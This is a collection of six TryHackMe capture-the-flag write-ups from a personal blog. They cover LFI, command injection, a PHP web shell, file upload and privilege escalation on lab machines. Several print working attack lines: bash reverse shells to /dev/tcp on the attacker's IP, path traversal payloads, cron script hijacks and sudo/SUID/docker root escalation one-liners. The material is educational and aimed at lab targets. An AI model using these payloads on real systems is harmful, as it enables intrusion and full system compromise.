[ { "title": "Watcher | Tryhackme write up", "url": "/posts/Watcher-Tryhackme-write-up/", "categories": "Blog, Writeup", "tags": "writeup, tryhackme, pentesting, penetration, testing, hacking, ethical, sudo privesc, fuzzing, enumeration, local, file, inclusion, LFI, cron job, watcher, medium", "date": "2022-05-13 18:30:00 +0200", "snippet": "Hi! this is my take on Watcher CTF from TryHackme, the room is simple but very entertaining.At first it seemed that it was going to be too easy but I liked that there were several privilege escalations and all of them were different.These are some topic you will see in this room: Directory fuzzing Local file inclusion Upload malicious file Abuse of sudo permissions for privilege escalation Abuse of cron job for privilege escalationRoom link: Watcher room TryhackmeScanningTo know what os I’m facing i start by running **ping -c 1 **, thanks to the TTL i can guess that this is a Linux box.I continue by running **Nmap** three times,I am using Syn scan against the whole port range of the victim machine,which shows me that there are three open ports, 21, 22 and 80.Nmap scanning for open portsKnowing this I re-launch it with the C and V scripts to find out version and service.-sCV scan to know versionsAnd finally with the http-enum script, which uses a small dictionary to fuzz well known routes.-sCV scan to know versionshttp-enum script resultsThere’s nothing weird and the discovery of robots.txt its interesting so I’m checking the web and robots.txt now.Website homepageThe web is running with Apache and seems like a Jekyll blog, some buttons are not even working so I’m going straight to robots.txt.robots.txt contentsThere are 2 file routes inside robots.txt the first one is accessible and it’s the first flag, the second one requires permissions that i dont have.First flagLooking again at the home page, I see something suspicious in the links of each post, it seems that the web could be vulnerable to LFI(Local File Inclusion)Vulnerable to LFI?I’m trying to list /etc/passwd and for that i’m using this route: http://VICTIMIP/post.php?post=../../../../../../etc/passwd. It works!Content of /etc/passwdI can see that there’s three users: toby, mat and will.Gaining accessI start by showing /secret_file_do_not_read.txt, the file i couldn’t read before because I had no permissions.But now with LFI it’s easy to see it’s contents:/secret_file_do_not_read.txt contentsReading this, I already know what i have to do, i have to login into ftp and try upload a malicious .php file because now i knowwhere there route to that file is.The credentials were valid, and now I’m login into ftp, where the second flag is located, and a files directory next to it.Ftp contentsI’m next writing my malicious file and uploading it into this files folder.This is the code I’m using:&amp;lt;?phpsystem($_GET[&#39;cmd&#39;]) ?&amp;gt;This code permits us to run a command with the GET request variable ‘cmd’.The upload is completed, and i know where the file exactly is.I show the file with the LFI i used before, running whoami with our new cmd variable.Remote code execution workingTo get a reverse shell, im gonna run this with my new RCE method, and I’m url encoding it:bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/MYIP/443 0&amp;gt;%1&#39;At the same time I’m listening port 443 with netcat.nc -lnvp 443With this i gained access as www-dataAccess gained as www-dataPrivilege escalationFirst privilege escalationAfter treating the terminal to turn it into an interactive one, I run sudo -l and see that i can run any command i want as toby without password,so i run sudo -u toby bash and I’m now toby.Easy privesc to tobySecond privilege escalationI continue by visiting toby’s home and there’s a note next to flag 3 and a directory called jobs. This is the content of note.txtnote.txt contentThere’s a cron job running and i guess it’s running into jobs directory. There’s a file inside jobs directory called cow.sh,it’s a script that backups an image into /tmp directory, but i have write permissions, so i change it’s contents to this:#!/bin/bashbash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/MYIP/444 0&amp;gt;%1&#39;I’m using port 444 now as I’m still using 443 for the reverse shell I’m actually using. After listening with netcat and waiting a minute, I get a reverse shell as Mat.Privesc to MatSecond privilege escalationAs before, the first two things i do is sudo -l and visiting my home. I can run python3 with a specific file as will and that file is inside my home.vSudo for matThe code of this will_script let’s me run three commands, ls, id and cat /etc/passwd, and it does it by calling a function from another script cmd.py.But I’m realizing that I’m the owner of cmd.py and i can write inside.Code of both scripts and permissionsI’m editing cmd.py code to run a bash instead ls -lah when using 1 as argument, and because i can run it as will, this bash will be as will too.New cmd.py codeAnd it works.Privilege escalation to willLast privilege escalation to rootI struggled a bit with this privilege escalation because I lost like 15min investigating around adm group and checking log files from /var/log,but after a bit i realized that there’s nothing there and after cheking some things like sudo -l, SUID files, I found a backups directory inside /opt.There’s a file named key.b64 inside, I’m decoding the content with base 64 and a private key is showing.Private ssh key foundAfter putting the key into an id_rsa file and using it like this from my terminal: ssh -id id_rsa root@VICTIMIPAccess as rootI got access as root!. Flags 4,5,6 and 7 was in /home/toby, /home/mat, /home/will and /root directories respectively, while flag 3 was in /var/www/html/See you soon and enjoy this nice CTF!" }, { "title": "Ultratech | Tryhackme writeup", "url": "/posts/Ultratech-tryhackme-writeup/", "categories": "Blog, Writeup", "tags": "writeup, tryhackme, pentesting, penetration, testing, hacking, ethical, Ultratech, docker privesc, enumeration, nodejs service, easy password cracking, medium", "date": "2022-05-08 18:30:00 +0200", "snippet": "This is my writeup for Ultratech room from Tryhackme, it’ a Medium difficulty room and it covers the following : User enumeration Fuzzing Nodejs API command injection Credential cracking Docker group privilege escalationScanningWhen doing the usual Nmap scan i get 4 open ports, 21 and 22 are the usual ones for ftp and ssh, but i dont know what the other two are so i run Nmap again but this time with -sCV options to know the services and versions of that ports.Nmap scanning for open ports-sCV scan to know version and service of ports 31331 8081The ports finally are Apache http for 31331 and Node for 8081.Im running whatweb in parallel to know what technologies the webs have.Web scanning with whatwebI don’t find nothing interesting so now i’m going to visit the port 31331 web first and see what i can find.The’re is a section of the web diplaying the members working on the project and their nicknames and these nicknames may be usernames for login so i save them.Potential usernamesFuzzingI can’t find anything else so i’m going to start fuzzing the 31331 port website.I’m using wfuzz with a short dictionary of routes, and the results are as follows:Fuzzing 31331 routeIm checking robots.txt first and this is interesting because there’s a route to another .txt inside.utech_sitemap.txtWhen checking this txt three routes are displaying, two of them are the ones that i previously saw when inspecting the web, but the third one is new./index.html/what.html**/partners.html**Inside /partners.html there’s a login panel.Login panel inside partners.htmlTrying random credentials redirects me to port 8081/auth route saying Invalid login.Checking the other routes i got when fuzzing, i see this api.js interesting file inside /js folder./js/api.js source codeGaining accessThe line in red is the most interesting to me, i think that maybe i can inject commands there.I tried the following: http://IP/ping?ip=MYIP | whoami (didn’t work) http://IP/ping?ip=MYIP ; whoami (didn’t work)(; got removed) http://IP/ping?ip= ‘whoami’ (didn’t work) http://IP/ping?ip= `whoami` (WORKS)(The idea of using `` came to my mind looking at the code i saw earlier and some NodeJs examples that i found online)With this i have Remote Command Execution and i can work getting a reverse shell.Sadly i can’t get a reverse shell from the search bar with various methods so I script this:#!/bin/bashbash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.8.70.95/443 0&amp;gt;&amp;amp;1&#39;And now i can get this script by tarting a python http server:python3 -m http.server 80and launching wget to the script route.http://MACHINEIP/ping?ip=`http://MYIP/script.sh`It worked!wget Completed: response 200 OKNow i could do bash script.sh, but i did ls before and there is a sqlite backup i didn’t see earlier.There are two hashes there, one of them for one of the names in the website.Two hashes inside the sqlite backupCracking the hashes in crackstation.net gives me the passwords:Hash 1 crackedHash 2 crackedNow im quickly trying the credentials in the login page from before. Both of them gives me the same result:Message from a dev to the user i had from beforeI didn’t know what to do, reading the message i randomly tought that maybe he wants me to login into the server, so i tried to login with the credentials i had into ssh and it worked!Access gained as non-privileged userPrivilege escalationFirst time i do is id and i see this output:id outputMy user has docker permissions so maybe i can mount machine’s / into the container as root.Doing this i see that there’s an image called bash:docker imagesSo now i can do this to mount / , run the container as root and then launch sh:docker run -v /:/mnt --rm -it bash chroot /mnt shPrivesc to root into the containerBecause the whole filesystem is mounted into my container, i can access everything outside the container from the inside.The last task asks me to get the first characters from root’s id_rsa, and i found it into /root/.ssh/id_rsa:Root’s private ssh keyI could create a new superuser for persistence or change root’s password as we can access and edit /etc/shadow and /etc/password,but as this is a ctf and i completed all the tasks, this ends here for me. Pretty interesting room 😊Thanks for reading, have a happy hacking!" }, { "title": "Boiler | Tryhackme writeup", "url": "/posts/Boiler-tryhackme-writeup/", "categories": "Blog, Writeup", "tags": "writeup, tryhackme, pentesting, penetration, testing, hacking, ethical, Boiler, ftp, Medium difficulty, SUID privesc", "date": "2022-05-05 18:30:00 +0200", "snippet": "I’ve recently completed BoilerCTF room from tryhackme, i hope it will be useful to someone, it was a nice room including: Enumeration Fuzzing A lot of rabbit holes :) sar2html exploitation SUID privilege escalation.Here we go:ScanningLike in any other CTF, i start by doing a scan of any open port with nmap followed by another scan with -sCV options for service name and version.First scan with NmapVersions scanThis time there’s 4 open ports of which ftp is the most interesting to me because boilymous ftp login is enabled.Knowking this i just login as boilymous with no password and there’s a .txt file inside, but it seems to be encrypted.Txt file contentsIt seems like a letter substitution to me so the first thing i test is ROT13. I use CyberChef to decrypt it and it’s in fact ROT13, but there’s nothing useful:Just wanted to see if you find it. Lol. Remember: Enumeration is the key!DiscoverySo now i have another 3 ports to work on, and i decide to follow the order given by the room flags. To answer the third, i check the web inside the port 10000 http service.There’s a webmin page there, and i know that the version is 1.930 thanks to the previous version scan i did. Knowing this i check searchsploit for vulnerabilities but the three showing up are for previous versions.With this i answer third flag with nay.Now i try to fuzz over port 80 route for answering question 5 and i quickly find /joomla that matches with question 5. When searching for the route the default joomla page is showing.Fuzzing again showed some more routes, i can see the admin login panel /administrator and some more joomla routes.Fuzzing port 80When i check the ones with “_” i can see some encrypted messages but all of them are rabbit holes except “_test” that is a sar2html tool.Gaining accessI’ve worked with sar2html before so i know that there’s an easy vulnerability around the plot variable.Just by assigning ;command to plot we can see the output of the command in the select host dropdown. sar2html exploitAs the tryhackme page hints that i don’t need to reverse shell, i do ls and there’s a log.txt file that catches my attention.And inside this file i find a log of connections with an user and password.User and password inside log.txtNow i can connect with ssh to port 55007 with that credentials.Access gained as low privilege userPrivilege escalationWhen going to /home i can see that there’s another user called stoner.Then there’s a file called backup.sh in my user’s home directory, and when i check the code to see what the script doesi see a comment with a string very similar to the password i got before.Comment inside backup.shSo i try to change to stoner with that password and it works!Access gained as stonerI find a file with a flag in stoner’s home.Flag foundStoner doesn’t have sudo privileges so i search for SUID files, and this is what i get:SUID filesI know that find as SUID is a privesc vector from previous experience, so i can just execute this and privesc to root:./find . -exec /bin/bash -p \\; -quitPrivilege escalated to rootLast flag is inside /root folder and now the room is done!It was an interesting room involving enumeration, fuzzing and a cool RCE with sar2html. Have a good time with it!" }, { "title": "Anonymous tryhackme writeup", "url": "/posts/Anonymous-tryhackme-writeup/", "categories": "Blog, Writeup", "tags": "writeup, tryhackme, pentesting, pen, testing, hacking, ethical, anonymous, ftp", "date": "2022-04-30 23:00:00 +0200", "snippet": "Today I’m going to be resolving the Anonymous room from tryhackme that is rated as Medium, but i see it more like an Easy and fast one. Take a sit and enjoy it!ScanningAs i always do, I start with a fast nmap scan to discover what ports are open and another scan with -sCV options to check the services and versions.I quickly see that there are 4 ports open and they are for ftp, ssh, and two for smbFirst scan with NmapVersions scanI can see with the versions script that the anonymous ftp login is active so i log in as anonymous with no password.There’s a hidden folder named scripts and there is this inside:Contents of ftp’s scripts directoryBefore continuing with the files, i want to run enum4linux to see if there is a share in the smb service, because the room asks for the name of it.And there it is, there are just pics inside, i could try to check with steghide but i prefer to continue with ftp files.Share name in smbGaining accessI downloaded everything and the file clean.sh looks like this:clean.sh codeIt could be affected by a cronjob because removed_files.log has a lot of lines that says that nothing was removed by clean.shand this could mean that this is a periodical task. With this in mind i check the script’s permissions and i can write, so i modify it to get a reverse shell:#!/bin/bashbash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;MYIP&amp;gt;/443 0&amp;gt;&amp;amp;1&#39;After waiting one minute i get the reverse shell as namelessoneAccess gained as namelessonePrivilege escalationThe first thing i do is see what is inside this user’s home directory and the user.txt flag is there next to the pics folder i saw with enum4linux.user.txt flag foundBefore trying to do anything with the pics i checked what SUID files are in the server and env was one of them. Running this line I gained access as root:env /bin/sh -pAccess gained as root!The last flag is in root directory as usually does:root.txt flag foundThis was an easy one for me, but at least it was funny.Thank you for reading me and have a good day!" }, { "title": "Dogcat tryhackme writeup", "url": "/posts/Dogcat-tryhackme-writeup/", "categories": "Blog, Writeup", "tags": "writeup, tryhackme, pentesting, pen, testing, hacking, ethical, dogcat, dog, cat", "date": "2022-04-29 14:26:00 +0200", "snippet": "kekWriteup of me, Bltz, resolving tryhackme’s easy room ‘All in One’, this is my first writeup of many. I’m a begginer so i might make some mistakes!This CTF room include the next topics: Local file inclusion Use of php wrapper with LFI Fuzzing Double privilege escalation Abusing sudo privilegesScanningA fast nmap scan gives me 2 ports that i use to rescan with -sCV options for services and versions, but no interesting information is shown.First scan with NmapI scanned the web too with whatweb but all versions are up to date and there’s nothing unusual.DiscoveryWebsiteLooking at the website i see 2 buttons that seems to display a random cat/dog image with the get var “view”, i try to modify the var value to something else and i got an error saying that only cat or dog are correct inputs.Then i try to use dogdog as “view” variable to see if any kind of filter id applying and it is, a new error shown, dogdog.php file doesn’t exist.A new error is shownThis seems like LFI to me 😉Gaining accessLFIFirst thing i try is to use null byte with ../dog/../../../../../etc/passwd%00 but an error is shown in the function include().I dont know what include() does but if i dont use %00 at the end of the string .php will be applied as extension and i couldn’t open other types of file.I try to use the php wrapper to encode index.php to base64 to get the source code and it works, after decoding it i get this:index.php source codeThere’s another var i didn’t see named “ext” that is the extension applied to the “view” var, being the default value .php.Then, writing ?view=../dog/../../../../../etc/passwd%00&amp;amp;ext= i manage to get /etc/passwd content./etc/passwd contentHaving this i quickly think in log posoning, and apache2 log var/log/apache2/access.log does the trickApache2 log is shownI modify a request with burpsuite changing the user agent to a little php code so we can execute commands remotely.Modified request with burpsuiteI write whoami into our new cmd variable and i check if it’s working and it is.RCE workingI url encode the code bellow and pass it as “cmd” variable and i send a bash to my netcat through 443 port where i was prevously listening.bash -c &#39;bash -i &amp;amp;&amp;gt; /dev/tcp/&amp;lt;MYIP&amp;gt;/443 0&amp;gt;&amp;amp;1&#39;shell as www-dataPrivilege escalationEscalation to low privilege userI check the sudo privileges for www-data and i can run env as root.www-data sudo privileges and privesc to rootWith this code we quickly privesc to root.sudo env /bin/shRight now I’m looking for the flags, one is in /var/www/html/. I dont find the second one so i do find / -name flag* and i get both 2 and 3, 2 is in /var/www and 3 in /root.Im stuck because i cant find flag 4. I tried some things, finaly i’ve just found a script and a .tar in /opt.When inspecting the script i realize that this is a docker container, and a hostname -I confirms it.Knowing this i think that maybe the script is involved in a cronjob that backups the website from time to time. With the script beignwritable, i just modify it to send me a shell as root (the owned and the one executing the cron job). But as this docker containerdoesn’t have nano or vi/vim i have to do it with echo.echo &#39;#!/bin/bash&#39; &amp;gt; FILEecho &quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/MYIP/444 0&amp;gt;&amp;amp;1&#39;&quot; &amp;gt;&amp;gt; FILEWith this i gain access as the real root user and the flag4.txt is located at /root of the real host.I hope this writeup was useful and interesting, see you soon!" }, { "title": "All in one tryhackme writeup", "url": "/posts/All-in-one-tryhackme-writeup/", "categories": "Blog, Writeup", "tags": "writeup, tryhackme, pentesting, pen, testing, hacking, ethical, all, in, one", "date": "2022-04-27 22:26:00 +0200", "snippet": "Writeup of me, Bltz, resolving tryhackme’s easy room ‘All in One’, this is my first writeup of many. I’m a begginer so i might make some mistakes!This CTF room include the next topics: Basic decrypt Wordpress user enumeration and file upload Fuzzing Double privilege escalation Abusing sudo privilegesScanningI start the room by making the usual scanning. I always ping the ip to check that is running and the TTL so i can determine if it’s windows or linuxand then i use nmap with syn scan script.First scan with NmapNow i continue with nmap -sCV on the previous open ports i got to check the services running on that ports and the version of them.Nmap service and version scanI can see that anonymous ftp login is allowed, so i try to login and see if there’s something usefull but its empty.Ftp anonymous login empty folderDiscoveryFuzzingThen i take a look at the website and the default apache login is shown, i take a look at the source code but there’s nothing out of the ordinary.Fuzzing with gobuster makes the trick and 2 routes were found.Fuzzing with gobusterWebsiteWhen browsing for hackathons route i encountered this:hackathons routeThe hackathons route seems like this, i check the source code too and i dont see anything weird, so i continue with the wordpress route.wordpress pageHere i can see that there’s a post with an username and i find the usual wordpress login page too in which i try to login as this user with the password Vinegar, but the password is invalid.After this i realize that there’s an uncommon header when i analyze a request to the wordpress page with burpsuite.Burpsuite request of wordpress pageThere’s a link in it and it happens that the wordpress wp-json resource is public, i check there if there is any user i dont know yet but no, there’s only one user and is the one i already have.:I stucked a bit here, trying to fuzzing hackathons route and trying to find something in wordpress route, but i got nothing.Then I go back to the Hackathons path and inspect the code again, seeing that there were two comments I didn’t see.Hidden comments in hackathon’s source codeGaining AccessThe text of the first comment seems encrypted, while the other one doesn’t, so i try to usecyberchef’s magic module and dcrypt.fr cipher identifier but none worked.Then I think that maybe the second comment is a key for the cipher, so I google ‘cipher with key’ and the first result is Vigenere Cipher,now it all makes sense and I see that the hackathons route was hiding a clue.A quick decryption with cyberchef works and i got a password that works with the username i had.Login successfull into the wordpress panelThen i use the theme editor to inject some php code into a .php file from the wordpress theme.Injecting php via Theme EditorWith this i can reverse shell or just upload a .php file to bypass the usual wordpress file upload. I decide to send a reverse shell to my terminal through netcat and turn it into a tty.Access gainedPrivilege escalationEscalation to low privilege userFirst i check the sudoers and suid files and there was nothing interesting, then i checked elyanas home directory and there was this hint:Elyana&#39;s user password is hidden in the system. Find it ;)Seeing that, i went to /var/www/html/wordpress/wp-config.php but the password was the same we got earlier and there was nothing in the database neither.I continue by trying to find files owned by elyana and i find this:Files found with elyana as ownerNow we are logged as elyana 🙂We manage to get logged as elyana!Escalation to rootI check again sudoers and i see that we can execute socat as sudo without password, and gtfobins has this oneliner that let me privesc to root.sudo socat stdin exec:/bin/shShell as rootWe privesc to root but the flags from user.txt and root.txt seems to be encrypted.Both flags were encryptedA quick search in cyberchef’s magic module tells me that it’s base64, so i decrypt it and we are done.Decrypted flagsThank you for reading me, have a good day and see you soon in future writeups! 😎" } ]
